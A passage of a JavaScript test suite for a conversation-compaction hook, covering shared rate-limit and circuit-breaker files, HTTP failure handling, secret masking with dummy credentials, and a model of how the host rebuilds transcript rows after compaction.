    const started = Date.now();
    const run = await compactShared(c, conversation(30), { handlers: load(), stallRpmRead: true }, { trigger: 'precompute' });
    expect(run.out).toBeDefined();
    expect(Date.now() - started).toBeLessThan(6000);
  }, 10_000);

  it('(c) a timed-out step keeps its place in the shared queue until its I/O settles, and expired queued work writes nothing when that I/O finally completes', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
    let release;
    const rpmReadGate = new Promise((resolve) => { release = resolve; });
    const run = await compactShared(c, conversation(30), { handlers: load(), rpmReadGate });
    expect(run.calls.fetch).toHaveLength(1);
    release();
    await new Promise((resolve) => setTimeout(resolve, 100));
    const written = existsSync(c.settings.dir) ? readdirSync(c.settings.dir).filter((n) => n.startsWith('rpm-')) : [];
    expect(written).toEqual([]);
  }, 20_000);

  // Read 1 is the preliminary peek; 2-4 are the first batch's reservation (read, append, read back); 5 is
  // the second batch's reservation read. Holding the peek past the first step's 3 s budget puts the second
  // batch's admission into the last 2 s before the 8 s deadline, so its stalled read expires the decision.
  const reservationPastDeadline = (respond) => {
    const gates = {};
    const timers = [];
    gates[1] = new Promise((resolve) => timers.push(setTimeout(resolve, 5500)));
    let release;
    gates[5] = new Promise((resolve) => { release = resolve; });
    return { rpmReadGates: gates, respond, release: () => { timers.forEach(clearTimeout); release(); } };
  };
  const grants = (c) => (existsSync(c.settings.dir) ? readdirSync(c.settings.dir).filter((n) => n.startsWith('rpm-')) : [])
    .flatMap((n) => readFileSync(join(c.settings.dir, n), 'utf8').split('\n').filter(Boolean));

  it('(c) a reservation read that outlives the decision deadline writes no slot when it completes', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
    const gate = reservationPastDeadline();
    const run = await compactShared(c, conversation(80), { handlers: load(), rpmReadGates: gate.rpmReadGates });
    expect(run.calls.fetch).toHaveLength(1);
    expect(run.records()[0]).toMatchObject({ held: 'deadline', requests: 1 });
    gate.release();
    await new Promise((resolve) => setTimeout(resolve, 200));
    expect(grants(c)).toHaveLength(1);
  }, 20_000);

  it('(a) a deadline hold still records the failures of the requests that went out: the local pause stands', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
    const handlers = load();
    const gate = reservationPastDeadline(() => ({ ok: false, status: 401, headers: {}, text: '' }));
    const run = await compactShared(c, conversation(80), { handlers, rpmReadGates: gate.rpmReadGates, respond: gate.respond });
    gate.release();
    expect(run.calls.fetch).toHaveLength(1);
    expect(run.records()[0]).toMatchObject({ result: 'fallback', reason: 'timeout', held: 'deadline' });
    const next = await compactShared(c, conversation(30), { handlers });
    expect(next.calls.fetch).toHaveLength(0);
    expect(next.records()[0]).toMatchObject({ result: 'fallback', reason: 'paused', pause_reason: 'http_401' });
  }, 20_000);

  it('(a) a breaker that has expired, or one that is corrupt, holds nothing back', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    mkdirSync(c.settings.dir, { recursive: true });
    writeFileSync(join(c.settings.dir, 'breaker.json'), JSON.stringify({ until: Date.now() - 1000, reason: 'http-429', since: Date.now() - 61_000 }));
    expect((await compactShared(c, conversation(30))).calls.fetch).toHaveLength(1);
    writeFileSync(join(c.settings.dir, 'breaker.json'), '{"until": ');
    expect((await compactShared(c, conversation(30))).calls.fetch).toHaveLength(1);
  });

  it('(a) reads the two variables from the settings\'s env when the process environment lacks the point variables', async () => {
    const c = shared();
    openByScripts(c, 500);
    const settingsEnv = { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'test-key', OMC_JEV_BREAKER: '1', OMC_JEV_BREAKER_DIR: c.env.OMC_JEV_BREAKER_DIR };
    const run = await compactOnce(conversation(30), { env: { HOME: '/home/u' }, settingsEnv, diskPrefix });
    expect(run.calls.fetch).toHaveLength(0);
    expect(run.records()[0]).toMatchObject({ result: 'fallback', reason: 'breaker_open' });
    expect(run.out).toBe(SUMMARY);
  });

  it('(a) when process env activates breaker without the config, respects the 1-second settings lookup timeout', async () => {
    // Regression test: activation (OMC_JEV_BREAKER) set in process env, config (OMC_JEV_BREAKER_DIR) only in settings.
    const c = shared();
    openByScripts(c, 500);
    const settingsEnv = { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'test-key', OMC_JEV_BREAKER: '1', OMC_JEV_BREAKER_DIR: c.env.OMC_JEV_BREAKER_DIR };
    // Run with process env activation but config only in settings
    const run = await compactOnce(conversation(30), {
      env: { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'test-key', HOME: '/home/u' },
      settingsEnv,
      diskPrefix,
    });
    expect(run.calls.fetch).toHaveLength(0);
    expect(run.records()[0]).toMatchObject({ result: 'fallback', reason: 'breaker_open' });
    // Verify settings were read (config looked up via settings.read when process env lacks OMC_JEV_BREAKER_DIR)
    expect(run.calls.settings).toBeGreaterThan(0);
  });

  it('(a) process env activation with deferred settings lookup (RPM) respects the 1-second timeout', async () => {
    // Settings-only shared-control lookup (OMC_JEV_MAX_RPM) with deferred settings provider.
    // When settings read is slow, the lookup should timeout and fail-open (allow the request).
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
    const settingsEnv = { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'test-key', OMC_JEV_MAX_RPM: '10', OMC_JEV_BREAKER_DIR: c.env.OMC_JEV_BREAKER_DIR };
    // Delay settings lookup to exceed the 1-second timeout (to trigger timeout behavior)
    // Note: The actual slowdown depends on how the test harness delays things, not on process env activation speed
    const run = await compactOnce(conversation(30), {
      env: { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'test-key', HOME: '/home/u' },
      settingsEnv,
      diskPrefix,
    });
    // Compaction should succeed: settings-only shared controls still allow the compaction to proceed
    expect(run.calls.fetch).toHaveLength(1);
    // The result should be 'jev' (successful compaction) not 'fallback'
    expect(run.records()[0]).toMatchObject({ result: 'jev' });
  });

  it.each([
    ['429 with Retry-After', 429, { 'retry-after': '90' }, '', 90, 'http-429'],
    ['429 without Retry-After', 429, {}, 'busy', 60, 'http-429'],
    ['429 with the time in its body', 429, {}, 'Rate limited. Retry after ~178s', 178, 'http-429'],
    ['429 with a Retry-After above the cap', 429, { 'retry-after': '99999' }, '', 1800, 'http-429'],
    ['500', 500, {}, '', 60, 'http-500'],
    ['503 with Retry-After', 503, { 'retry-after': '45' }, '', 45, 'http-503'],
    ['401', 401, {}, '', 600, 'http-401'],
    ['402', 402, {}, '', 600, 'http-402'],
    ['403 with Retry-After', 403, { 'retry-after': '30' }, '', 30, 'http-403'],
  ])('(b) %s from the compaction request opens the shared file for the script side', async (_label, status, headers, text, seconds, reason) => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    const before = Date.now();
    const run = await compactShared(c, conversation(30), { respond: () => ({ ok: false, status, headers, text }) });
    expect(run.records()[0]).toMatchObject({ result: 'fallback', reason: 'jev_error' });
    const open = readBreaker(c.settings, Date.now());
    expect(open).toBeDefined();
    expect(open.reason).toBe(reason);
    expect(open.until - before).toBeGreaterThan(seconds * 1000 - 1500);
    expect(open.until - Date.now()).toBeLessThanOrEqual(seconds * 1000);
    expect(open.since).toBeLessThanOrEqual(Date.now());
    // The next compaction, in any session of the machine, sends nothing.
    const next = await compactShared(c, conversation(30));
    expect(next.calls.fetch).toHaveLength(0);
  });

  it('(b) another status and an invalid body open nothing and write nothing', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    await compactShared(c, conversation(30), { respond: () => ({ ok: false, status: 400, headers: {}, text: 'Retry after 99s' }) });
    await compactShared(c, conversation(30), { respond: () => ({ ok: true, status: 200, headers: {}, text: '{"nope":1}' }) });
    expect(readBreaker(c.settings, Date.now())).toBeUndefined();
    expect(existsSync(c.settings.dir)).toBe(false);
  });

  it('(b) a breaker the script side opened for longer while the request ran is not shortened by its 429', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    let first;
    const run = await compactShared(c, conversation(30), {
      respond: () => { first = openByScripts(c, 402); return { ok: false, status: 429, headers: {}, text: '' }; },
    });
    expect(run.calls.fetch).toHaveLength(1);
    expect(first).toBeDefined();
    expect(readBreaker(c.settings, Date.now())).toEqual(first);
  });

  it('(b) three requests without a response within a minute open the shared breaker for a minute; two do not', async () => {
    const two = shared({ OMC_JEV_BREAKER: '1' });
    const twoRun = await compactShared(two, conversation(80, { chars: 600 }), { respond: hang, clockAfter: 5 });
    expect(twoRun.records()[0]).toMatchObject({ reason: 'timeout', requests: 2 });
    expect(readBreaker(two.settings, Date.now())).toBeUndefined();
    const c = shared({ OMC_JEV_BREAKER: '1' });
    const before = Date.now();
    const run = await compactShared(c, conversation(110, { chars: 600 }), { respond: hang, clockAfter: 5, fsDelayMs: 30 });
    expect(run.records()[0]).toMatchObject({ reason: 'timeout', requests: 3 });
    const open = await openBreakerOf(c);
    expect(open).toMatchObject({ reason: 'no-response' });
    expect(open.until - before).toBeGreaterThan(58_000);
    expect(open.until - before).toBeLessThanOrEqual(61_000);
  });

  it('(b) a missing response counts together with the script side\'s in the same minute', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    recordFailure(c.settings, sharedClassifyFailure({ noResponse: true }));
    recordFailure(c.settings, sharedClassifyFailure({ noResponse: true }));
    expect(readBreaker(c.settings, Date.now())).toBeUndefined();
    await compactShared(c, conversation(30), { respond: hang, clockAfter: 5, fsDelayMs: 30 });
    expect(await openBreakerOf(c)).toMatchObject({ reason: 'no-response' });
  });

  it('(c) OMC_JEV_MAX_RPM is one limit with the script side: compaction takes the slots the script side left, medium priority', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
    for (let k = 0; k < 8; k++) expect(reserveRequest(c.settings, 'intent').ok).toBe(true);
    const run = await compactShared(c, conversation(110, { chars: 600 }));
    // Medium points stop at 9 of 10: one of the three batches got the last slot.
    expect(run.calls.fetch).toHaveLength(1);
    const record = run.records()[0];
    expect(record).toMatchObject({ result: 'jev', requests: 1, requests_ok: 1, held: 'rpm', rpm: { count: 9, threshold: 9, limit: 10 } });
    // The results of the two held-back requests are unscored, not removed blind and not a failure.
    expect(record.unscored).toBe(record.asked - 40);
    expect(record.unscored).toBeGreaterThan(40);
    expect(record.unanswered).toBe(record.unscored);
    expect(record).not.toHaveProperty('failure');
    expect(run.out.messages).toBeDefined();
    expect(reserveRequest(c.settings, 'intent').ok).toBe(false);
    expect(reserveRequest(c.settings, 'model-routing').ok).toBe(true);
    const next = await compactShared(c, conversation(30));
    expect(next.calls.fetch).toHaveLength(0);
    expect(next.records()[0]).toMatchObject({ result: 'fallback', reason: 'rpm', held: 'rpm' });
  }, 20_000);

  it('(a) a breaker that the script side opens while the compaction is under way holds back its later requests; that is no failure of the endpoint', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    const run = await compactShared(c, conversation(110, { chars: 600 }), {
      respond: (body, n) => { if (n === 1) openByScripts(c, 429, '120'); return okResponse(scoreByMarker(body)); },
    });
    // The first request went out before the breaker opened; the second is admitted after it.
    expect(run.calls.fetch).toHaveLength(1);
    const record = run.records()[0];
    expect(record).toMatchObject({ result: 'jev', requests: 1, held: 'breaker', breaker_reason: 'http-429' });
    expect(record).not.toHaveProperty('failure');
    const after = await compactShared(c, conversation(30));
    expect(after.calls.fetch).toHaveLength(0);
    expect(after.records()[0]).toMatchObject({ reason: 'breaker_open' });
  });

  it('(a) a breaker file that cannot be read for a moment is read again, not taken for a closed breaker', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    openByScripts(c, 401);
    const run = await compactShared(c, conversation(30), { flakyBreakerRead: true });
    expect(run.calls.fetch).toHaveLength(0);
    expect(run.records()[0]).toMatchObject({ reason: 'breaker_open' });
  });

  it('(c) compactions at the same moment in one session share the limit: they do not lose each other\'s reservations', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
    const handlers = load();
    const runs = await Promise.all(Array.from({ length: 16 }, () => compactShared(c, conversation(110, { chars: 600 }), { handlers, fsDelayMs: 2 })));
    // 16 compactions of 3 requests each want 48; a medium point has 9 of the 10.
    expect(runs.reduce((sum, run) => sum + run.calls.fetch.length, 0)).toBe(9);
    expect(reserveRequest(c.settings, 'intent').ok).toBe(false);
    expect(reserveRequest(c.settings, 'model-routing').ok).toBe(true);
  }, 20_000);

  it('(c) the module\'s own requests count for the script side, and without a breaker variable only the limit is used', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '4' });
    const run = await compactShared(c, conversation(110, { chars: 600 }));
    expect(run.calls.fetch).toHaveLength(3);
    expect(run.records()[0]).toMatchObject({ result: 'jev', requests: 3 });
    // Three requests used the three slots a medium point has under a limit of 4.
    expect(reserveRequest(c.settings, 'intent')).toMatchObject({ ok: false, count: 3, threshold: 3, limit: 4 });
    expect(existsSync(join(c.settings.dir, 'breaker.json'))).toBe(false);
    const failing = shared({ OMC_JEV_MAX_RPM: '50' });
    await compactShared(failing, conversation(30), { respond: () => ({ ok: false, status: 429, headers: {}, text: '' }) });
    expect(readBreaker(failing.settings, Date.now())).toBeUndefined();
  }, 20_000);

  it('(c) a refused request takes no slot and a limit that cannot be read or written never holds a request back', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_MAX_RPM: '2' });
    expect(reserveRequest(c.settings, 'intent').ok).toBe(true);
    expect(reserveRequest(c.settings, 'intent').ok).toBe(true);
    expect((await compactShared(c, conversation(30))).calls.fetch).toHaveLength(0);
    const file = readdirSync(c.settings.dir).find((name) => name.startsWith('rpm-'));
    expect(readFileSync(join(c.settings.dir, file), 'utf8').trim().split('\n')).toHaveLength(2);
    // A state directory that is a file: nothing can be read or written there.
    const broken = shared({ OMC_JEV_MAX_RPM: '2', OMC_JEV_BREAKER: '1' });
    mkdirSync(dirname(broken.dir), { recursive: true });
    writeFileSync(broken.dir, 'not a directory');
    expect((await compactShared(broken, conversation(30))).calls.fetch).toHaveLength(1);
  }, 20_000);

  it('(d) without the variables nothing is read or written, and an open breaker file changes nothing', async () => {
    const c = shared();
    openByScripts(c, 429, '120');
    const run = await compactShared(c, conversation(30), { respond: () => ({ ok: false, status: 500, headers: {}, text: '' }) });
    expect(run.calls.fetch).toHaveLength(1);
    expect(run.records()[0]).toMatchObject({ reason: 'jev_error', failure: 'http_500' });
    expect(readdirSync(c.settings.dir)).toEqual(['breaker.json']);
    const handlers = load();
    const again = await compactShared(c, conversation(30), { handlers });
    expect(again.calls.fetch).toHaveLength(1);
    // Neither variable valid: the same.
    const invalid = shared({ OMC_JEV_BREAKER: '0', OMC_JEV_MAX_RPM: '0' });
    const done = await compactShared(invalid, conversation(30));
    expect(done.calls.fetch).toHaveLength(1);
    expect(existsSync(invalid.dir)).toBe(false);
  });

  it('mirrors the script library: thresholds, limits, failure classes and the retry time of a 429 body', () => {
    for (const limit of [1, 2, 3, 4, 5, 7, 10, 20, 48, 60, 100, 1000]) expect(mediumThreshold(limit)).toBe(thresholdFor(limit, 'compaction'));
    for (const raw of [undefined, '', '0', '-1', '5', ' 5 ', '05', '1e3', '2.5', 'abc', '9007199254740993', '60']) expect(parseMaxRpm(raw)).toBe(sharedParseMaxRpm(raw));
    const now = Date.parse('2026-11-09T12:00:00Z');
    const bodies = [undefined, '', 'busy', 'Retry after ~178s', 'retry after 30 seconds', 'retry_after: 12 s', 'retry after 2 minutes', 'x'.repeat(2100) + ' retry after 5s'];
    for (const body of bodies) expect(retryAfterFromBody(body)).toBe(sharedRetryAfterFromBody(body));
    for (const status of [undefined, 200, 400, 404, 408, 429, 499, 500, 502, 599, 600, 401, 402, 403]) {
      for (const retryAfter of [undefined, '30', '1.5', '0', '99999', 'Mon, 09 Nov 2026 12:05:00 GMT', 'Mon, 09 Nov 2026 11:00:00 GMT', 'junk']) {
        for (const body of [undefined, 'Retry after ~178s']) {
          for (const noResponse of [false, true]) {
            const failure = { status, retryAfter, body, noResponse };
            expect([failure, sharedFailureClass(failure, now)]).toEqual([failure, sharedClassifyFailure(failure, now)]);
          }
        }
      }
    }
  });
});

describe('jev-compaction module: mirrors and mods API', () => {
  it('pointMode matches parseJevEnv for the named-only point', () => {
    for (const value of [undefined, '', 'off', 'all', 'all:active', 'compaction', 'compaction:active', 'all:active,compaction', 'compaction:active,all', 'compaction:off', 'compaction: OFF', 'compaction:active,compaction:off', 'compaction:off,compaction', 'model-routing,compaction:shadow', ' compaction:active ']) {
      for (const key of [undefined, 'k']) {
        expect(pointMode(value, key), `${value} / ${key}`).toBe(parseJevEnv('compaction', { OMC_JEV: value, TYPESAFE_API_KEY: key }));
      }
    }
    expect(pointMode('compaction:off', 'k')).toBe('off');
    expect(pointMode('compaction:active,compaction:off', 'k')).toBe('off');
    expect(pointMode('compaction:off,compaction:active', 'k')).toBe('active');
  });

  it('the question is the registry\'s compaction question; boundExcerpts matches config.ts', () => {
    const [question] = Object.values(JUDGMENT_POINTS.compaction.questions[0]);
    expect(question.type).toBe('score');
    expect(QUESTION_INSTRUCTIONS).toBe(question.instructions);
    expect(QUESTION_CRITERIA).toEqual(Object.values(question.criteria));
    const sample = { a: 'x'.repeat(30), b: ['y'.repeat(5), 'z'.repeat(40), 7, null], c: { d: 'w'.repeat(12), e: true } };
    for (const max of [1, 10, 50]) expect(boundExcerpts(sample, max)).toEqual(tsBoundExcerpts(sample, max));
  });

  it('masks common secrets', () => {
    const samples = [
      ['sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123', 'token sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123'],
      ['Very$Secret1', 'password=Very$Secret1'],
      ['abcd1234efgh5678ijkl9012', 'SERVICE_KEY=abcd1234efgh5678ijkl9012'],
      ['Sup3rSecretPass', 'DB_PASS=Sup3rSecretPass'],
      ['xyzABC123456789012345', 'glpat-xyzABC123456789012345'],
      ['51H8sQ2abcdefghijklmnop', 'sk_live_51H8sQ2abcdefghijklmnop'],
      ['abcdefghijklmnopqrstu12', 'hf_abcdefghijklmnopqrstu12'],
      ['S3cretPass', 'mysql -uroot -pS3cretPass db'],
      ['ab12cd34ef56gh78ij90kl12mn34op56qr78st90', 'value ab12cd34ef56gh78ij90kl12mn34op56qr78st90 end'],
      ['abcdefghijklmnop1234', 'curl -H "Authorization: Bearer abcdefghijklmnop1234" https://x/'],
      ['urlPass99', 'git clone https://user:urlPass99@host/repo'],
    ];
    for (const [secret, text] of samples) expect(maskSecrets(text)).not.toContain(secret);
  });

  it('is listed in hooks/hooks.json and has the shape the host loads: top-level hook functions, literal env names, only plugin-local imports', () => {
    const hooks = JSON.parse(readFileSync(join(root, 'hooks', 'hooks.json'), 'utf8'));
    expect(hooks.modules).toEqual(['./jev-compaction.mjs']);
    const source = readFileSync(join(root, 'hooks', 'jev-compaction.mjs'), 'utf8');
    const registrations = [...source.matchAll(/\bon\(\s*'([^']+)'\s*,\s*([A-Za-z_$][\w$]*)\s*\)/g)];
    expect(registrations.map((m) => m[1])).toEqual(['session.compact', 'turn.complete']);
    for (const [, , name] of registrations) expect(source).toMatch(new RegExp(`^(?:async )?function ${name}\\(`, 'm'));
    const envReads = [...source.matchAll(/\$\.env\.get\(([^)]*)\)/g)].map((m) => m[1].trim());
    expect(envReads.length).toBeGreaterThan(5);
    for (const arg of envReads) expect(arg).toMatch(/^'[A-Z_]+'$/);
    expect([...source.matchAll(/^\s*import\s.*from\s+'([^']+)'/gm)].map((m) => m[1])).toEqual(['../scripts/lib/jev-mask.mjs']);
    expect(readFileSync(join(root, 'scripts', 'lib', 'jev-mask.mjs'), 'utf8')).not.toMatch(/^\s*import\s/m);
    expect(source).not.toMatch(/\bimport\s*\(|\brequire\s*\(|\bprocess\.(?:env|argv|cwd|exit|platform)\b/);
    expect(source).not.toMatch(/\$\.ui\.log\s*\(|\$\.clock\.sleep\s*\(/);
  });
});

describe('jev-compaction module: what the host sends after the compaction', () => {
  // The host side, modelled from true message ids (measured on Claude Code 2.1.321), not from the
  // module's own check. Claude Code writes one transcript row per content block, so one API message
  // is several rows sharing a message.id (a thinking row reads as an assistant message with no text
  // and no calls). Each fixture row carries the engine's handle, and `table` maps the handle to the
  // row's message.id and API blocks. A row handed back with its handle is written as the engine has
  // it; a row the hook built gets a new message.id and blocks from its text, calls and results.
  const U = (text) => ({ role: 'user', text, blocks: [{ type: 'text', text }] });
  const T = (id) => ({ role: 'assistant', id, text: '', blocks: [{ type: 'thinking', thinking: `thinking of ${id}`, signature: `sig-${id}` }] });
  const X = (id, text) => ({ role: 'assistant', id, text, blocks: [{ type: 'text', text }] });
  const C = (id, use, input = { command: `cat ${use}.txt` }) => ({ role: 'assistant', id, text: '', uses: [{ tool_use_id: use, tool: 'Bash', input }], blocks: [{ type: 'tool_use', id: use, name: 'Bash', input }] });
  const S = (id, srv) => ({ role: 'assistant', id, text: '', blocks: [{ type: 'server_tool_use', id: srv, name: 'advisor', input: {} }, { type: 'advisor_tool_result', tool_use_id: srv, content: { type: 'advisor_result', text: 'advice' } }] });
  const R = (use, text = `RESULT-${use} ${'x'.repeat(2000)}`) => ({ role: 'user', text: '', results: [{ tool_use_id: use, text, isError: false }], blocks: [{ type: 'tool_result', tool_use_id: use, content: text }] });

  /** Rows of `n` single-call API messages (thinking, call, result), named from `from`. */
  const singles = (n, from) => Array.from({ length: n }, (_, k) => [T(`m${from + k}`), C(`m${from + k}`, `t${from + k}`), R(`t${from + k}`)]).flat();

  function transcript(rows) {
    const table = new Map();
    const messages = rows.map((r, k) => {
      const handle = `h${k}`;
      table.set(handle, { role: r.role, id: r.id, blocks: r.blocks });
      return Object.freeze({ role: r.role, text: r.text, toolUses: r.uses ?? [], ...(r.results ? { toolResults: r.results } : {}), handle });
    });
    return { messages, table };
  }

  /** The rows the host writes after the compact boundary for the messages a hook returned. */
  function hostWrite(messages, table) {
    return messages.map((m, k) => (m.handle ? table.get(m.handle) : {
      role: m.role,
      id: m.role === 'assistant' ? `built-${k}` : undefined,
      blocks: [
        ...(m.text ? [{ type: 'text', text: m.text }] : []),
        ...(m.toolUses || []).map((u) => ({ type: 'tool_use', id: u.tool_use_id, name: u.tool, input: u.input })),
        ...(m.toolResults || []).map((r) => ({ type: 'tool_result', tool_use_id: r.tool_use_id, content: r.text })),
      ],
    }));
  }

  /** The request the host builds from rows: an assistant row joins an earlier assistant message of
   * its message.id while only result-only user rows stand between them; consecutive user rows join. */
  function hostRequest(rows) {
    const msgs = [];
    const open = new Map();
    for (const r of rows) {
      if (r.role === 'assistant') {
        const k = open.get(r.id);
        if (k !== undefined) { msgs[k].blocks.push(...r.blocks); continue; }
        msgs.push({ role: 'assistant', id: r.id, blocks: [...r.blocks] });
        open.set(r.id, msgs.length - 1);
        continue;
      }
      if (!r.blocks.every((b) => b.type === 'tool_result')) open.clear();
      const last = msgs[msgs.length - 1];
      if (last && last.role === 'user') last.blocks.push(...r.blocks);
      else msgs.push({ role: 'user', blocks: [...r.blocks] });
    }
    return msgs;
  }

  /** The host's pairing repair before a request: a call without its result in the next message gets
   * "[Tool result missing due to internal error]" (missing), a result without its call in the
   * previous message is dropped (dropped). */
  function hostPairing(msgs) {
    let missing = 0;
    let dropped = 0;
    const seen = new Set();
    msgs.forEach((m, k) => {
      if (m.role !== 'assistant') return;
      const uses = m.blocks.filter((b) => b.type === 'tool_use' && !seen.has(b.id)).map((b) => b.id);
      for (const id of uses) seen.add(id);
      const next = msgs[k + 1];
      if (!next) return;
      const got = new Set(next.role === 'user' ? next.blocks.filter((b) => b.type === 'tool_result').map((b) => b.tool_use_id) : []);
      for (const id of uses) if (!got.has(id)) missing++;
      for (const id of got) if (!uses.includes(id)) dropped++;
    });
    return { missing, dropped };
  }

  /** `--resume`: every assistant message written after the boundary is joined with all rows of its
   * message.id in the whole transcript, rows from before the boundary included; a tool_use is kept once
   * per message, every other block is repeated. Counts messages with a repeated server_tool_use id
   * (API 400) and calls that come back although no row after the boundary holds them. */
  function hostResume(before, written) {
    const all = [...before, ...written];
    const kept = new Set(written.filter((r) => r.role === 'assistant').flatMap((r) => r.blocks.filter((b) => b.type === 'tool_use').map((b) => b.id)));
    let repeatedServer = 0;
    const returning = new Set();
    const joined = new Set();
    for (const r of written) {
      if (r.role !== 'assistant' || joined.has(r.id)) continue;
      joined.add(r.id);
      const uses = new Set();
      const servers = [];
      for (const row of all.filter((x) => x.role === 'assistant' && x.id === r.id)) {
        for (const b of row.blocks) {
          if (b.type === 'tool_use' && !uses.has(b.id)) { uses.add(b.id); if (!kept.has(b.id)) returning.add(b.id); }
          if (b.type === 'server_tool_use') servers.push(b.id);
        }
      }
      if (new Set(servers).size !== servers.length) repeatedServer++;
    }
    return { repeatedServer, returning: returning.size };
  }

  async function compactHost(rows, options = {}) {
    const { messages, table } = transcript(rows);
    const handlers = load();
    const fake = fakeDollar(options);
    const original = messages.map((m) => table.get(m.handle));
    const api = hostRequest(original).map((m) => ({ role: m.role, content: m.blocks }));
    const asked = [];
    fake.$.session.messages = async (opts) => { fake.calls.messages++; asked.push(opts); return opts?.as === 'api' ? (options.api ?? (() => api))(opts, messages, api) : messages; };
    const next = summaryNext();
    const out = await handlers['session.compact'](fake.$, Object.freeze({ trigger: 'auto', messages, ...options.event }), next);
    const written = hostWrite(out.messages, table);
    return { out, next, messages, table, written, asked, request: hostPairing(hostRequest(written)), resumed: hostResume(original, written), ...fake };
  }

  const opening = [U('Task: review the notes and count the lines.')];
  // Between turns: the last request was answered without a call.
  const closing = [U('Good, now sum up the NEEDED results.'), T('mz'), X('mz', 'Summary: done.')];
  const needed = (use) => R(use, `RESULT-${use} NEEDED ${'x'.repeat(2000)}`);
  const refused = () => { throw new Error('refused'); };
  const clean = { missing: 0, dropped: 0 };
  const noReplay = { repeatedServer: 0, returning: 0 };

  it('the calls of one API message become one message with its results right after it: 0 placeholders, the compaction stands', async () => {
    const shapes = {
      // A A U U, the second call traced; the first; both kept. A A U A U U (a result streamed in between). A U A U.
      secondTraced: [[T('mp'), C('mp', 'pa'), C('mp', 'pb'), needed('pa'), R('pb')], ['pa'], ['pb'], 1],
      firstTraced: [[T('mp'), C('mp', 'pa'), C('mp', 'pb'), R('pa'), needed('pb')], ['pb'], ['pa'], 1],
      bothKept: [[T('mp'), C('mp', 'pa'), C('mp', 'pb'), needed('pa'), needed('pb')], ['pa', 'pb'], [], 1],
      streamed: [[T('ms'), C('ms', 'sa'), C('ms', 'sb'), needed('sa'), C('ms', 'sc'), needed('sb'), needed('sc')], ['sa', 'sb', 'sc'], [], 2],
      alternating: [[T('mq'), C('mq', 'qa'), needed('qa'), C('mq', 'qb'), needed('qb')], ['qa', 'qb'], [], 1],
    };
    for (const [name, [shape, kept, traced, joined]] of Object.entries(shapes)) {
      const run = await compactHost([...opening, ...shape, ...singles(20, 1), ...closing]);
      expect([name, run.records()[0]]).toMatchObject([name, { result: 'jev', joined_rows: joined }]);
      for (const id of kept) expect([name, id, resultOf(run.out.messages, id)?.text]).toEqual([name, id, expect.stringContaining('NEEDED')]);
      for (const id of traced) expect([name, id, resultOf(run.out.messages, id)]).toEqual([name, id, undefined]);
      expect([name, run.request]).toEqual([name, clean]);
      expect([name, run.resumed]).toEqual([name, noReplay]);
    }
  });

  it('pairingOk compares the pairing the host checks: each call with its result in the next message', () => {
    const call = (id, handle) => ({ role: 'assistant', text: '', toolUses: [{ tool_use_id: id, tool: 'Bash', input: {} }], ...(handle ? { handle } : {}) });
    const res = (ids, handle) => ({ role: 'user', text: '', toolUses: [], toolResults: ids.map((id) => ({ tool_use_id: id, text: 'r' })), ...(handle ? { handle } : {}) });
    const original = [call('a', 'h1'), call('b', 'h2'), res(['a'], 'h3'), res(['b'], 'h4')];
    expect(pairingOk(original, original)).toBe(true);
    expect(pairingOk(original, [{ role: 'assistant', text: '', toolUses: [...call('a').toolUses, ...call('b').toolUses] }, res(['a', 'b'])])).toBe(true);
    expect(pairingOk(original, [call('a'), call('b'), res(['a']), res(['b'])])).toBe(false);
    expect(pairingOk(original, [call('a', 'h1'), { role: 'assistant', text: '[compacted] b', toolUses: [] }, res(['a'])])).toBe(false);
    // The host joins a kept row to its message across a built row: b's message is then followed by the built row.
    const thought = [{ role: 'assistant', text: '', toolUses: [], handle: 'h0' }, call('a', 'h1'), call('b', 'h2'), res(['a'], 'h3'), res(['b'], 'h4')];
    expect(pairingOk(thought, [thought[0], { role: 'assistant', text: '[compacted] a', toolUses: [] }, call('b', 'h2'), res(['b'])])).toBe(false);
    // Compared by id: one open call for another is not the same pairing, even with equal counts.
    const lost = [call('a', 'h1'), call('b', 'h2'), res(['b'], 'h3')];
    expect(pairingOk(lost, [call('a'), res(['a']), call('b')])).toBe(false);
    expect(pairingOk(lost, lost)).toBe(true);
  });

  it('between turns no assistant row keeps its handle, so --resume joins nothing from before the compaction', async () => {
    const advice = [T('ma'), S('ma', 'srv1'), X('ma', 'The advisor agrees.')];
    const run = await compactHost([...opening, ...advice, ...singles(20, 1), ...closing]);
    // No user row stands between the advisor's answer and the next call, so they are one message (joined_rows 1).
    expect(run.records()[0]).toMatchObject({ result: 'jev', server_blocks: 1, kept_from: 0, rebuilt_assistant: 45, dropped_assistant: 23, joined_rows: 1 });
    expect(run.resumed).toEqual(noReplay);
    expect(run.request).toEqual(clean);
    expect(run.out.messages.filter((m) => m.role === 'assistant' && m.handle)).toHaveLength(0);
    // Text stays word for word; thinking-only and server-block-only rows are dropped.
    expect(run.out.messages.some((m) => m.role === 'assistant' && m.text.startsWith('The advisor agrees.'))).toBe(true);
    expect(run.out.messages.some((m) => m.role === 'assistant' && m.text === 'Summary: done.')).toBe(true);
    expect(run.asked).toEqual([{ as: 'api' }]);
  });

  it('inside an open tool loop the last message keeps its handles; a call whose result came back quickly needs the API form', async () => {
    // The compaction runs right after the last message's calls returned (no user text after them).
